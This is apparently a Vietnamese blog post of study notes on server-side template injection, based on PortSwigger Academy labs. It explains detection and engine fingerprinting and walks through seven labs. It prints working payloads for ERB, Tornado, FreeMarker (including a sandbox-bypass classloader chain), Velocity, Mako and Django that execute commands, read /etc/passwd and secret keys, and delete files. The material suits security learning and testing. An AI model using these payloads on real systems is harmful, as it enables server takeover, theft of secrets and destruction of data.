---
layout: post
title:  "SSTI"
date:   2025-08-22 12:00:00 +0700
tags: PortSwigger
categories: jekyll update
---

# Server-side template injection (SSTI)

## SSTI là cái gì? 

Lỗ hổng SSTI xảy ra khi ứng dụng xử lý dữ liệu đầu vào của người dùng trong template engine mà không kiểm soát tốt. 
- **Mức độ nguy hiểm nhất**: kẻ tấn công có thể thực hiện RCE ➡️ chiếm toàn quyền máy chủ. 
- **Trường hợp ít nghiêm trọng hơn:** dù không RCE được, kẻ tấn công vẫn có thể **đọc dữ liệu nhạy cảm** hoặc **truy cập file tùy ý** trên server.
-**Một số trường hợp hiếm**: SSTI không gây rủi ro đáng kể.

## SSTI xảy ra như thế nào?

SSTI xảy ra khi **user input** được **nối trực tiếp vào trong template**, thay vì được truyền vào template như dữ liệu tách biệt.

Những static template chỉ dùng placeholder để chèn dữ liệu động vào thì thường không bị dính lỗ hổng SSTI. Ví dụ, một email chào người dùng bằng tên của họ, như đoạn code trong `Twig template` sau: 

```
$output = $twig ->render("Dear {first_name},", array("first_name => $user.first_name") );
```

Đoạn này không bị SSTI, vì tên người dùng chỉ được truyền vào template dưới dạng dữ liệu, chứ không được nối trực tếp hoặc thực thi. 

Tuy nhiên, Template engine thực chất chỉ là **chuỗi** ➡️ nếu dev **nối trực tiếp input của user** vào template, thì input đó sẽ **được coi như 1 phần của template**.

```
$output = $twig->render("Dear " . $_GET['name']); 
```

Trong ví dụ này, thay vì truyền dữ liệu tĩnh vào template, thì một phần của template lại được tạo động dựa trên tham số `name` trong URL. 

Vì cú pháp template được xử lý ở server, attacker có thể nhét payload SSTI vào tham số này, ví dụ:

```URL
http://vulnerable-website.com/?name={{payload}}
```

## Cấu trúc tấn công SSTI 

![ssti-methodology-diagram](https://hackmd.io/_uploads/SJg-XsZKgl.png)

### Detect 

SSTI thường bị ẩn, không ai để ý trừ khi kiểm tra kỹ. Một khi phát hiện ➡️ khai thác rất đơn giản. Trong môi trường **không sandbox** ➡️ nguy hiểm hơn, vì attacker có thể chạy lệnh trực tiếp lên server.

Bước 1 thử fuzz bằng các ký tự đặc biệt ➡️ nếu lỗi thì khả năng có SSTI `${{<%[%'"}}%\`. Nhưng mà chưa đủ, phải xác định ngữ cảnh (cách input được xử lý trong template) mới khai thác được. 

SSTI tồn tại trong **hai ngữ cảnh khác nhau**. Mỗi ngữ cảnh cần cách phát hiện riêng. Dù fuzzing có ra dấu hiệu hay không, mình phải thử các phương pháp theo ngữ cảnh. 
Nếu có lỗ hổng, việc xác định đúng ngữ cảnh là bắt buộc để khai thác.

### Plaintext context 

Hầu hết các template language cho phép mình đưa nội dung vào theo hai cách:
1. Dùng trực tiếp thẻ HTML 
2. Dùng cú pháp riêng của template

Ví dụ, trong Freemarker, `render('Hello ' + username)` sẽ render ra thành `Hello Carlos`

Hay nhầm lẫn giữa SSTI qua XSS, cho nên là thử payload toán học là cách nhanh để phân biệt XSS thường với SSTI. 

Ví dụ, template mà bao gồm code lỗ hổng nè:

```
render('Hello ' + username)
```

Mình có thể test là:

```URL
http://vulnerable-website.com/?username=${7*7}
```

Nếu nó in ra `Hello 49` là cho thấy có SSTI. 

### Code context 

Trong một số trường hợp khác, lỗ hổng lộ ra khi gửi **dữ liệu do người dùng nhập** được chèn bên trong một biểu thức template, giống như ví dụ về email trước đó. 

Điều này có thể xuất hiện dưới dạng 1 tên biến trong tamplate lại được kiểm soát bởi người dùng. 

```
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
```

Điều này in ra `Hello Carlos`

Trên website, kết quả trên URL sẽ như sau: 

```URL
http://vulnerable-website.com/?greeting=data.username
```

Ngữ cảnh này thường dễ bị bỏ qua kiểm thử vì: 
- Nó ko tạo ra dấu hiệu rõ ràng như XSS 
- Thoạt nhìn, nó gấn giống hệt một thao tác tra cứu hashmap đơn giản. 

Một cách kiểm tra SSTI trong ngữ cảnh này là:
- Trước hết, xác định rằng tham số không có XSS trực tiếp bằng cách thử chèn một đoạn HTML bất kỳ vào giá trị. 

```URL
http://vulnerable-website.com/?greeting=data.username<tag>
```

Nếu không có XSS, khi chèn HTML thì thường sẽ ra một trong các kết quả sau:
- Output trống (ví dụ chỉ hiển thị `Hello` mà không có tên)
- Các thẻ HTML bị mã hóa, không được render
- Hoặc hiện ra thông báo lỗi 

Test 1: chèn HTML để kiểm tra có XSS không.
Nếu không có XSS -> Test 2: thử dùng cú pháp template (`}}`, `%}`,...) để break out khoải expression, sau đó chèn HTML -> nếu thành công, có thể khai thác SSTI. 

```URl
http://vulnerable-web.com/?greeting=data.username}}<tag>
```

- Lỗi /blank output ➡️ có thể sai cú pháp, hoặc ko có lỗi SSTI
- Render thành công + có HTML mình chèn ➡️ chắc chắn là SSTI 

`Hello Carlos<tag>`

### Identify 

Có rất nhiều loại template engine khác nhau (Jinja2, Twig, Freemarker, Velocity, Smarty,...)

Chúng thường có cú pháp khá giống nhau (ví dụ `{{ }}`, `${ }`, ...) hoặc `<%=foobar%>` được thiết kế để không xung đột với ký tự HTML. 

Có thể dùng payload để thăm dò web dùng engine gì. 

Có thể gửi **một cú pháp sai** vào chỗ nghi ngờ có SSTI. 
Server sẽ ném ra thông báo lỗi, và trong nhiều trường hợp:
- Cho biết engine đang dùng (Jinja2, ERB, Twig, Velocity,...)
- Thậm chí cho biết luôn version của engine đó. 

Nếu không có thông báo lỗi rõ ràng về template engine ➡️ mình phải thử
- Cách làm:
1. Inject payload đặc trưng của từng template engine (`{{7*7}}`, `${7*7}`, `<%=7*7%>`, `#{7*7}`,...)
2. Quan sát kết quả: 
    - Nếu server trả về `49` thì cú pháp đó hợp lệ -> thu hẹp được template engine 
    - Nếu server trả về nguyên chuỗi -> cú pháp không hợp lệ -> loại engine đó đi.

![template-decision-tree](https://hackmd.io/_uploads/BkhRK2ztxg.png)

Mình cần lưu ý rằng cùng 1 payload đôi khi có thể trả về kết quả thành công trong nhiều ngôn ngữ template khác nhau. 
Ví dụ, payload `{{7*'7'}}` trả về `49` trong Twig và `7777777` trong Jinja2. 

### Exploit 

#### READ 

Nếu chưa rõ về template engine, thì nên đọc document của nó.

#### Tìm hiểu syntax basic template 

Biết những thứ đơn giản như học cách nhúng các khối code (native code blocks) vào trong template cũng đôi khi có thể nhanh chóng dẫn đến một khai thác. 

Ví dụ, khi biết 1 template engine `Mako` dựa trên Python đang dùng thì RCE có thể đơn giản như sau:

```Mako
<%
    import os 
    x=os.popen('id').read()
    %>
    ${x}
```

### LAB01 - Basic server-side template injection 

Ở lab này thì cho biết dùng template engine là ERB. Và mình sẽ phải tìm hiểu đọc document để xem cách nó thực thi code để xóa file `morale.txt` từ thư mục home của Carlos. 

Khi truy cập vào lab thì nó chỉ có chức năng review sản phẩm. 

![image](https://hackmd.io/_uploads/BkiQR3ztll.png)

Thì nó thông qua tham số `message`. Và mình tìm hiểu template engine của ERB là: 

![image](https://hackmd.io/_uploads/Hy3_CnMFlg.png)

Thì mình thử dùng `<%=7*7%>` thì payload nó sẽ in ra: 

![image](https://hackmd.io/_uploads/rkte16ftel.png)

Từ đây, thì mình đọc file `/etc/passwd`

![image](https://hackmd.io/_uploads/BJ2X1pzKgl.png)

Truyền payload sau để xóa file. `<%=File.delete('/home/carlos/morale.txt')%>`

### LAB02 - Basic server-side template injection (code context)

Trong lab này thì dùng Tornado template. Mình cũng sẽ phải đọc code và tìm ra cách thực thi code, để xóa file `morale.txt` trong folder home của Carlos.

Mình cũng được cung cấp 1 credentials là `wiener:peter`

Khi login vào mình thấy 1 có chức thay đổi tên hiển thị như sau: 

![image](https://hackmd.io/_uploads/BkoIZ6ztxl.png)

Thì khi mình submit comment trong bài post nó sẽ hiển thị tên mình theo chức năng đã chọn. 

Và sau khi tìm hiểu thì template Tornado thực thi code theo như sau: 

![image](https://hackmd.io/_uploads/Bkgj-6MFxe.png)

Mình sẽ truyền payload `}}{{7*7}}` để xem nó có thực thi ko. 

![image](https://hackmd.io/_uploads/ByBgM6GYll.png)

Kiểm tra lại phần hiển thị tên trong bài post thì như sau: 

![image](https://hackmd.io/_uploads/Byimf6fYgx.png)

Từ đây mình bắt đầu SSTI để load file thử. Do Tornado là engine dựa vào python nên mình phải tìm cách import thư viện os để thực thi code. 

![image](https://hackmd.io/_uploads/HkxEXpMFxg.png)

Sau khi reload lại thì như sau: 

![image](https://hackmd.io/_uploads/HyEBQaGFlx.png)

Vậy thì truyền payload để xóa file thành công. 

![image](https://hackmd.io/_uploads/ByOumTfKel.png)

#### Read about the security implications 

Trong những document của template engine ngoài những hướng dẫn cơ bản nhưng nó cũng nói về phần bảo mật. 

Nếu trong template không có `Security` riêng, thì nếu trong template engine có hàm thay đối tượng nào tiềm ẩn rủi ro bảo mật, tài liệu hầu như luôn có cảnh bảo. 

Ví dụ, trong ERB, tài liệu hướng dẫn chỉ ra rằng ta có thể liệt kê toàn bộ thư mục và đọc các file tùy ý bằng 1 đoạn code cụ thể. 

```
<%= Dir.entires('/') %>
<%= File.open('/example/arbitrary-file').read %>
```

### LAB03 - Server-side template injection using documentation 

Cũng tương tự mô tả trong lab02 và mình được cung cấp 1 account là `content-manager:C0nt3ntM4n4g3r`

Sau khi login và truy cập vào 1 sản phẩm thì nó có chức năng edit template. 

![image](https://hackmd.io/_uploads/ryYwc6fYee.png)

Khi mình thử inject vào `${foobar}` thì nó như sau: 

![image](https://hackmd.io/_uploads/rJdTq6zteg.png)

Từ đây mình biết được FreeMarker template. 

Từ đây mình khi đọc file document thì biết được có 1 Class cho phép mình thực thi code: 

`${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}`

![image](https://hackmd.io/_uploads/rkleqhaGFxx.png)

Từ đây mình truyền payload để có thể xóa file. 

![image](https://hackmd.io/_uploads/By32h6fKge.png)

#### Tìm các khai thác đã được biết tới 

Sau khi biết engine nào đang chạy ➡️ tìm thử exploit công khai trên mạng ➡️ tận dụng hoặc chỉnh sửa để khai thác. 

### LAB04 - Server-side template injection in an unknown language with a documented exploit 

Cũng tương tự mô tả trong các lab. Nhưng mình ko được cung cấp engine đang chạy. 

Sau khi thử hết các payload nhưng mà ko thành công, nên mình bắt đầu fuzz bằng `${{<%[%'"}}%\` 

![image](https://hackmd.io/_uploads/Sy6ym0MFxe.png)

Mình thấy nó có các thư viện như `handlebar`, sau khi tìm hiểu thì đây là template engine lun. 

Sau khi tham khảo tại [Link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#handlebars)

![image](https://hackmd.io/_uploads/SJUYEAMYxx.png)

Từ đây, mình sửa lại câu lệnh execute. 

![image](https://hackmd.io/_uploads/HyourRMtlx.png)

## Explore 

- Nếu mà chưa tìm được exploit từ document, thì mình khám phá môi trường của template engine để biết mình có thể truy cập vào những object nào.
- Nhiều template engine có object đặc biệt như `self` hoặc `environment`, đóng vai trò như "namespace" chứa toàn bộ biến, method, attribute mà engine hỗ trợ. 
- Nếu tìm được object này ➡️ có thể liệt kê ra các biến/hàm có sẵn trong scope. 
ví dụ với template engine trong Java, mình có thể inject: 
`${T(java.lang.System).getenv()}`

### Developer-supplied object 

1. Website có cả object built-in và object tùy chỉnh do dev tạo. Object tùy chỉnh thường chứa data nhạy cảm hoặc method nguy hiểm, nên cần chú ý đặc biệt.
2. Object có thể khác nhau giữa các template, nên cần kiểm tra từng template riêng.
3. SSTI ko phải lúc nào cũng dẫn tới RCE, nhưng vẫn có thể khai thác cho các vụ khác nghiêm trọng, như đọc file nhạy cảm, path traversal, hoặc leak dữ liệu. 

### LAB05 - Server-side template injection with information disclosure via user-supplied objects 

Lab này mình phải tìm cách để leak dữ liệu nhạy cảm. Mình được cung cấp 1 account là `content-manager:C0nt3ntM4n4g3r` 

Sau khi login thì mình thấy có trong phần sản phẩm thì có `Edit Template`

![image](https://hackmd.io/_uploads/ByMCuRzKge.png)

Nhưng mình cũng ko thể biết nó dùng template engine nào vì nó khi inject sai thì nó ko ra lỗi. 

Mình tiếp tục thử fuzz như bài lab trước. Sau khi fuzz thì nó ra lỗi 

![image](https://hackmd.io/_uploads/HkzBtCztgx.png)

Thấy thì nó là Django. Vậy mình thử inject là 
```html
    {% debug %}
```

Thì load lại mình nhìn thấy nó in ra các object. 

![image](https://hackmd.io/_uploads/ByQB90MYgx.png)

và trong Django, secret key thì được chứa trong biến SECRET_KEY và trong object `settings` là một module quan trọng ví nó chứa tất cả cấu hình của project. 

Như vậy mình sửa lại là `{{settings.SECRET_KEY}}`

![image](https://hackmd.io/_uploads/SJ0ys0MKgl.png)

## Tạo 1 cuộc attack tùy chỉnh 

### Cấu trúc 1 cuộc khai thác custom dùng object chain 

1. Xác định các object và method mà mình có thể truy cập
    - Một số object chứa thông tin quan trọng. 
    - Kết hợp kiến thức của mình với tài liệu chính thức, mình có thể lập ra danh sách các object cần điều tra kỹ hơn.

2. Nghiên cứu kỹ các object trong tài liệu:
    - Chú ý các method mà object cho phép sử dụng 
    - Chú ý các object và method đó trả về 

3. Ghép nối các object và method (chaining):
    - Khi biết cách "nối chuỗi" đúng, mình có thể truy cập chức năng nguy hiểm hoặc dữ liệu nhạy cảm. 

Ví dụ, trong template engine Java-based Velocity, mình truy cập `ClassTool` object được gọi `$class`. Nghiên cứu tài liệu mình có thể liên kết method`$class.inspect()` và thuộc tính `$class.type` tham chiếu đến object đó. 

Nó đã được exploit từ trước như sau: 
`$class.inspect("java.lang.Runtime").type.getRuntime().exec("payload")`

### LAB06 - Server-side template injection in a sandboxed environment 

Trong lab này dùng Freemarker template engine. Và nó được đặt trong môi trường sandbox và mình phải lấy file `my_password.txt` tại `/home/Carlos`

Mình cũng được cung cấp 1 account là `content-manager:C0nt3ntM4n4g3r`

Sau khi login thì mình trong phần xem product thì có chức năng edit template. 

![image](https://hackmd.io/_uploads/HJdBky7Fee.png)

Mình thử inject `${7*7}` 

![image](https://hackmd.io/_uploads/HJyu1JXtxe.png)

Mình thử inject vào bằng payload RCE là: `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}`

![image](https://hackmd.io/_uploads/HJqCkJmFxl.png)

Nó trả về là `freemarker.template.utility.Execute is not allowed....` ➡️ Vì ứng dụng chỉ cho phép edit trong môi trường sandbox, có thể là **Sandbox is based on method blocklist**

Sau khi đọc về cách bypass sandbox [Blackhat](https://media.defcon.org/DEF%20CON%2028/DEF%20CON%20Safe%20Mode%20presentations/DEF%20CON%20Safe%20Mode%20-%20Alvaro%20Mun%CC%83oz%20and%20Oleksandr%20Mirosh%20-%20Room%20For%20Escape%20Scribbling%20Outside%20The%20Lines%20Of%20Template%20Security.pdf)

Từ đây có hai cách sau dựa vào object `product` sẵn có: 

**Cách 1**: Đọc file bất kỳ dưới dạng decimal

`${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`

![image](https://hackmd.io/_uploads/Hyb3e1mKxx.png)

Từ đây, mình có thể chuyển từ decimal sang text. 

![image](https://hackmd.io/_uploads/BJLb-ymKel.png)

Cách 2: RCE bằng payload 

```
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("<SYSTEM CMD>")}
```

Từ đó, thay lại thành `cat /home/carlos/my_password.txt`

![image](https://hackmd.io/_uploads/H1x8by7Fxe.png)

### Cấu trúc 1 custom exploit dùng developer-supplied objects 

- Một số template engine được thiết kế chạy trong môi trường an toàn, hạn chế để bị RCE. 
- Tuy nhiên, một số object do dev tạo ra và expose vào trong template thường kém an toàn hơn, dễ bị khai thác.
- Template built-in thường có tài liệu chi tiết => dễ nghiên cứu 
- Nhưng site-specific object (object tùy biến cho web đó) ko có tài liệu ➡️ phải tự phân tích hành vi website, thử nghiệm để tìm attack surface và viết exploit riêng. 

### LAB07 - Server-side template injection with a custom exploit 

Trong lab này mình phải khai thác và xóa `/.ssh/id_rsa` tại `/home/carlos/`, 1 credential được cung cấp `wiener:peter`

![image](https://hackmd.io/_uploads/S1SpGJQFeg.png)

Sau khi login và trong phần view comment thì nó lại bị dính SSTI như trong lab2 ở phần hiển thị tên. 

Thì mình xem xét kỹ thì nó dùng object `user`, sau đó mình thử upload 1 file bất kỳ lên. 

![image](https://hackmd.io/_uploads/B1e5XJmFgg.png)

Như vậy file `/home/carlos/User.php` và quan sát kỹ thì nó gọi tới `User->setAvatar()`. Và nó chỉ chấp nhận có mimetype là hình ảnh. 

Như vậy mình thử upload 1 file hợp lệ để xác định đường dẫn:

![image](https://hackmd.io/_uploads/SJpONJ7tgx.png)

Và từ object `user` mình set thành `user.setAvatar('/etc/passwd','image/jpg')`

Sau đó, mình truy cập `/avatar?avatar=wiener` thì được tải xún 1 file. 

![image](https://hackmd.io/_uploads/rJCsLgmtxl.png)

Từ đây, mình có thể truyền `/home/carlos/User.php`

Từ đó, mình lấy được source của `User.php`

```PHP
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```

Nhìn thấy thì có hàm `gdpDelete()` và khi mình dùng `setAvatar()` thì nó sẽ tạo 1 symlink đến file đó. 

Nên mình thử tạo 1 symlink đến file cần xóa và sau đó gọi hàm `gdpDelete()`

![image](https://hackmd.io/_uploads/HkYKP-QFex.png)

Như vậy khi mình truyền vào khi comment ở bài post thì nó sẽ gọi tới hàm này. 

